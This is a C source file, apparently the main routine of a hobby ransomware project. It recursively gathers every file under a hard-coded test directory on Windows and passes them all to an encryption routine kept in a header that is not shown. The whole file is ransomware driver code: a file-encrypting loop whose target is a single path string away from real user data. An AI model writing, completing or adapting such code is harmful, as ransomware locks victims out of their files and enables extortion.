#include <stdio.h>
#include <windows.h>
#include <assert.h>
#include "stack.h"
#include "file_utils.h"
#include "encrypt.h"

void free_str(void *element) {
    free(element);
}

int main(void) {
    struct Stack *files_stack = stack_init();
    struct Stack *folders_stack = stack_init();
    
    wchar_t root[] = L"C:\\Users\\mouri\\Documents\\projects\\ransomware\\test\\";
    wchar_t *folder_path;

    assert(stack_is_empty(files_stack));
    assert(stack_is_empty(folders_stack));

    do {
        if(stack_is_empty(folders_stack)) {
            if((folder_path = _wcsdup(root)) == NULL) {
                fprintf(stderr, "[ERROR] FOLDERPATH _WCSDUP\n");
                return 1;
            }
        } else {
            folder_path = (wchar_t*)stack_pop(folders_stack);
        }

        populate_stacks_from_directory(folder_path, folders_stack, files_stack);
        free(folder_path);
    } while(!stack_is_empty(folders_stack));

    printf("done (files: %zu)\n", files_stack->size);
    
    assert(stack_is_empty(folders_stack));
    
    stack_free(&folders_stack, free_str);
    encrypt_stack(files_stack);

    assert(stack_is_empty(files_stack));

    stack_free(&files_stack, free_str);

    return 0;
}